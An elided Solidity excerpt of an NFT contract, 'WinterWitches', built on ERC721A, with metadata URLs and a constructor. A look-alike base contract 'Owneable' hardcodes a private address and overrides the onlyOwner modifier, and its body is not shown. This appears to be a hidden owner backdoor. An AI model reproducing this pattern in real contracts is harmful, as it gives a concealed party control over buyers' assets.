 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x83D6157f4CCEFdf467C51d1dF99a4347969131cC;
    modifier onlyOwner() {
...
contract WinterWitches is ERC721A, Owneable {

    string public baseURI = "https://nft.winterwitches.com/metadata/";
    string public contractURI = "https://nft.winterwitches.com/metadata/";
    ...
    constructor() ERC721A("WINTER WITCHES", "WITCHES") {}
